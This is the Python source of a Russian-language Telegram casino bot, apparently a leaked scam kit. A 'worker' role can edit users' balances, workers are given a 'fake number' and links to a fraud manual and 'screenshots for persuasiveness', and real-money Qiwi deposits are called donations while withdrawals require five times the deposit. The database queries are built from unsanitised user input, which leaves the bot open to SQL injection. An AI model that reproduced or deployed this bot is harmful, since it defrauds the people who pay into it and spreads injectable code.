#!/usr/bin/python
# -*- coding: utf-8 -*-
# Слито на @Oblako_sxem
import sqlite3
import json
import time
import logging
from casino_config import bot, admin_1, admin_2, fake_number, cashier
from casino_config import get_status, get_balance, get_referals, get_ref_balance, get_ref_link, get_inf_profil
from casino_keyboard import markup_inline_soglashenie, keyboard_osnova, \
    keyboard_admin, keyboard_worker, keyboard_vivod, keyboard_balance_top_up_amount_2, \
    keyboard_balance_top_up_amount, nazad_admin, nazad_worker
from casino_money import vivod_money_1, worker_zp, _set_bill_id, \
    _create_invoice, _top_up_balance, _reset_bill_id, _get_user_balance, \
    _get_user_bill_id
from casino_functions import admin_rassilka, chan_balance, chan_status, ins_workers, del_workers
from casino_casino import play_casino

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# Первый старт + подключение клавиатуры
@bot.message_handler(commands=['start'])
def send_welcome(message):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    cur.execute(f"select count(*) from users where id = {message.chat.id}")
    if cur.fetchone()[0] == 0:
        con.commit()
        bot.send_message(message.from_user.id,
                         f"🎉Привет, {message.chat.first_name}!\n\n"
                         f"Политика и условия пользования данным ботом .\n"
                         f"1. Играя у нас, вы берёте все риски за свои средства на себя.\n"
                         f"2. Принимая правила, Вы подтверждаете своё совершеннолетие!\n"
                         f"3. Ваш аккаунт может быть забанен в подозрении на мошенничество/обман нашей системы!\n"
                         f"4. Мультиаккаунты запрещены!\n"
                         f"5. Скрипты, схемы использовать запрещено!\n"
                         f"6. Если будут выявлены вышеперчисленные случаи, Ваш аккаунт будет заморожен до выяснения обстоятельств!\n"
                         f"7. В случае необходимости администрация имеет право запросить у Вас документы, подтверждающие Вашу личность и Ваше совершеннолетие.\n"
                         f"MoneyBot\n"
                         f"Вы играете на виртуальные монеты, покупая их за настоящие деньги. Любое пополнение бота является пожертвованием!  Вывод денежных средств осуществляется только при достижении баланса, в 5 раз превышающего с сумму Вашего пополнения!По всем вопросам Вывода средств, по вопросам пополнения, а так же вопросам играм обогащайтесь в поддержку, указанную в описании к боту. Пишите сразу по делу, а не «Здравствуйте! Тут?»\n"
                         f"Старайтесь изложить свои мысли четко и ясно, что поддержка не мучалась и не пыталась Вас понять.\n"
                         f"Спасибо за понимание!\n"
                         f"Удачи в игре.\n"
                         f"Ваша задача - угадать, в каком диапазоне будет располагаться выпадшее число. \n"
                         f"От 0 до 50, либо от 50 до 100, в таком случае Вы получаете удовение суммы ставки, либо же если Ваше число будет равно 50, то тогда Вы получаете выигрыш равный 10 Вашим ставкам. Но вероятность выпадения данного числа намного ниже.\n\n"
                         f"Удачи!",
                         reply_markup=markup_inline_soglashenie)

        # Проверяем наличие босса
        ref = message.text
        if len(ref) != 6:
            try:
                ref = int(ref[7:])
                con = sqlite3.connect("dannie_2.db")
                cur = con.cursor()
                cur.execute(f"select count(*) from users where id = {ref}")
                if cur.fetchone()[0] != 0:
                    con.commit()
                    boss = ref
                else:
                    con.commit()
                    boss = admin_1
            except:
                boss = admin_1
        else:
            boss = admin_1

        # Добавляем пользователю данные
        id = message.chat.id
        name = (f"{message.chat.first_name} {'|'} {message.chat.last_name}")
        status = 0
        balance = 0
        last_popolnenie = 0
        referals = 0
        ref_balance = 0
        con = sqlite3.connect("dannie_2.db")
        cur = con.cursor()
        cur.execute(f"INSERT INTO users (id,name,status,balance,last_popolnenie,referals,ref_balance,boss) "
                    f"VALUES ({id},\"{name}\",{status},{balance},{last_popolnenie},{referals},{ref_balance},{boss})")
        con.commit()

        # Добавляем боссу + 1 реферал
        con = sqlite3.connect("dannie_2.db")
        cur = con.cursor()
        cur.execute(f"SELECT referals FROM users WHERE id = {boss}")
        referal = cur.fetchone()[0]
        referals = referal + 1
        con.commit()
        con = sqlite3.connect("dannie_2.db")
        cur = con.cursor()
        cur.execute(f"UPDATE users SET referals = {referals} WHERE id = {boss}")
        con.commit()


    else:
        con.commit()
        balance = get_balance(message)
        referals = get_referals(message)
        ref_balance = get_ref_balance(message)
        ref_link = get_ref_link(message)
        inf_profil = get_inf_profil(balance, referals, ref_balance, ref_link)
        bot.send_message(message.from_user.id, f"🤘Привет, {message.chat.first_name},  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                		                                             📝 Цель игры:  ├─Пополняем Счет🤘                                                                                 ├─Играем🎰                              └─Получаем Деньги 💹                                                                                                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                                                    📢 Новости 👉 https://t.me/kasinohomka",
                         reply_markup=keyboard_osnova())


# Ответы
@bot.callback_query_handler(func=lambda call: True)
def answer(call):
    if call.data == "soglashenie":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        balance = get_balance(call.message)
        referals = get_referals(call.message)
        ref_balance = get_ref_balance(call.message)
        ref_link = get_ref_link(call.message)
        inf_profil = get_inf_profil(balance, referals, ref_balance, ref_link)
        bot.send_message(call.message.chat.id, f"{inf_profil}", reply_markup=keyboard_osnova())

    try:
        callback = json.loads(call.data or "")
        if callback.get("amount"):
            user_id = call.message.chat.id
            pay_url, bill_id = _create_invoice(int(callback.get("amount")))
            _set_bill_id(user_id, bill_id)
            bot.send_message(call.message.chat.id, f"Пополните баланс по ссылке:\n{pay_url}",
                             reply_markup=keyboard_balance_top_up_amount_2())
    except:
        pass


# Работа бота
@bot.message_handler(content_types="text")
def get_text_message(message):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    balance = get_balance(message)
    referals = get_referals(message)
    ref_balance = get_ref_balance(message)
    ref_link = get_ref_link(message)
    inf_profil = get_inf_profil(balance, referals, ref_balance, ref_link)
    cur.execute(f"select count(*) from workers where id = {message.chat.id}")
    
    if message.text == "🏝️Личный кабинет🏝️":
        bot.send_message(message.from_user.id, f"{inf_profil}")
        

    if message.text == "🎰Играть🎰":
        bot.send_message(message.from_user.id, "🤖Отправьте любое сообщение, чтобы продолжить🤖")
        bot.register_next_step_handler(message, play_casino)

    elif message.text == "💳Пополнить💳":
        bot.send_message(message.from_user.id, "Пополнение от 50₽!             Пишем админу за пополнением, пример:         ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                             ->ID Телеграм!🎲                                     ->Вежливость!☺️                                                ->Реквезиты!💰                                                                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                              🔥Админ🔥 -> @softiceerpo ",

                         reply_markup=keyboard_balance_top_up_amount())

    elif message.text == "Проверить оплату":
        user_id = message.chat.id
        bill_id = _get_user_bill_id(message.from_user.id)
        if bill_id is None:
            bot.send_message(user_id, "Вы не начинали оплату!")
            return

        bill_status = cashier.check_bill(bill_id)
        if bill_status.is_paid:
            money = bill_status.amount.value
            cur.execute(f"UPDATE users SET status = {1} WHERE id = {user_id}")
            con.commit()
            cur.execute(f"UPDATE users SET last_popolnenie = {money} WHERE id = {user_id}")
            con.commit()
            con.close()
            _top_up_balance(user_id, bill_status.amount.value)
            bot.send_message(admin_1, f"На Ваш Киви Кошелёк поступило пополнение!")
            bot.send_message(admin_2, f"На Ваш Киви Кошелёк поступило пополнение!")
            bot.send_message(user_id,
                             f"Ваш баланс успешно пополненен и состаляет: "
                             f"{_get_user_balance(user_id)}")
            _reset_bill_id(message.chat.id)

        else:
            bot.send_message(user_id, "Вы не оплатили счёт!❌")

    elif message.text == "💰Вывести💰":
        bot.send_message(message.from_user.id, "Вывод строго от 100₽!✅                                                                                 Пишем за выводом админу, пример:                                                     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                             ->Видео с балансом!🎲                                     ->Вежливость!☺️                                                ->Реквезиты!💰                                                                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                              🔥Админ🔥 -> @softiceerpo", reply_markup=keyboard_vivod())
        bot.register_next_step_handler(message, vivod_money_1)

    elif message.text == "Админ" and message.chat.id == admin_1 or message.chat.id == admin_2:
        bot.send_message(message.from_user.id, "Вы перешли в меню админа", reply_markup=keyboard_admin())
        bot.register_next_step_handler(message, get_text_message_admin)

    elif message.text == "Воркер" and cur.fetchone()[0] != 0:
        bot.send_message(message.from_user.id, "Вы перешли в меню воркера", reply_markup=keyboard_worker())
        bot.register_next_step_handler(message, get_text_message_worker)

    elif message.text == "Назад":
        bot.send_message(message.from_user.id, "🔙 Вы вернулись в главное меню", reply_markup=keyboard_osnova())


# Доступные функции админа
@bot.message_handler(content_types="text")
def get_text_message_admin(message):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    if message.text == "Сделать рассылку":
        bot.send_message(message.from_user.id, "Введите текст рассылки")
        bot.register_next_step_handler(message, admin_rassilka)

    elif message.text == "Изменить баланс":
        cur.execute("SELECT id, name, balance FROM users")
        id = cur.fetchall()
        for id in id:
            bot.send_message(message.from_user.id, f"{id}")
            time.sleep(1)
        bot.send_message(message.from_user.id, "Введите id человека, которому Вы хотите изменить баланс",
                         reply_markup=nazad_admin())
        bot.register_next_step_handler(message, chan_balance)

    elif message.text == "Изменить статус":
        cur.execute("SELECT id, name, status FROM users")
        id = cur.fetchall()
        for id in id:
            bot.send_message(message.from_user.id, f"{id}")
            time.sleep(1)
        bot.send_message(message.from_user.id, "Введите id человека, которому Вы хотите изменить статус",
                         reply_markup=nazad_admin())
        bot.register_next_step_handler(message, chan_status)

    elif message.text == "Добавить воркера":
        cur.execute("SELECT id, name FROM users")
        id = cur.fetchall()
        for id in id:
            bot.send_message(message.from_user.id, f"{id}")
            time.sleep(1)
        bot.send_message(message.from_user.id, "Введите id человека, которого Вы хотите сделать воркером",
                         reply_markup=nazad_admin())
        bot.register_next_step_handler(message, ins_workers)

    elif message.text == "Удалить воркера":
        cur.execute("SELECT id FROM workers")
        id = cur.fetchall()
        for id in id:
            bot.send_message(message.from_user.id, f"{id}")
            time.sleep(1)
        bot.send_message(message.from_user.id, "Введите id человека, которого Вы хотите удалить из воркеров",
                         reply_markup=nazad_admin())
        bot.register_next_step_handler(message, del_workers)

    elif message.text == "Информация":
        cur.execute("SELECT COUNT(1) FROM users")
        users = cur.fetchone()
        cur.execute("SELECT COUNT(1) FROM workers")
        workers = cur.fetchone()
        bot.send_message(message.from_user.id, f"Число пользователей: {users[0]}\n"
                                               f"Число воркеров: {workers[0]}\n"
                                               f"Фейковый номер: {fake_number}")
        bot.register_next_step_handler(message, get_text_message_admin)

    elif message.text == "Выйти":
        bot.send_message(message.from_user.id, "Вы покинули меню админа", reply_markup=keyboard_osnova())


# Доступные функции воркера
@bot.message_handler(content_types="text")
def get_text_message_worker(message):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    balance = get_balance(message)
    referals = get_referals(message)
    ref_balance = get_ref_balance(message)
    ref_link = get_ref_link(message)
    inf_profil = get_inf_profil(balance, referals, ref_balance, ref_link)

    if message.text == "Изменить баланс":
        cur.execute("SELECT id, name, balance FROM users")
        id = cur.fetchall()
        for id in id:
            bot.send_message(message.from_user.id, f"{id}")
            time.sleep(1)
        bot.send_message(message.from_user.id, "Введите id человека, которому Вы хотите изменить баланс",
                         reply_markup=nazad_worker())
        bot.register_next_step_handler(message, chan_balance)

    elif message.text == "Вывести средства":
        bot.send_message(message.from_user.id, f"{inf_profil}")
        bot.send_message(message.from_user.id,
                         "💵 Введите сумму для вывода 💵 \n\n❗Выводы принимаются только от 500 рублей❗")
        bot.register_next_step_handler(message, worker_zp)

    elif message.text == "Информация":
        bot.send_message(message.from_user.id, f"Фейковый номер: {fake_number}\n\n"
                                               f"Как пользоваться ботом: [ССЫЛКА](https://tgraph.io/Kak-polzovatsya-botom-08-03)\n\n"
                                               f"Мануал для работы: [ССЫЛКА](https://tgraph.io/Manual-dlya-raboty-08-03)\n\n"
                                               f"Скрины для убедительности Слито на @Oblako_sxem : ССЫЛКА", parse_mode='Markdown')
        bot.register_next_step_handler(message, get_text_message_worker)

    elif message.text == "Выйти":
        bot.send_message(message.from_user.id, "Вы покинули меню воркера", reply_markup=keyboard_osnova())

if __name__ == '__main__':
    bot.polling(none_stop=True)
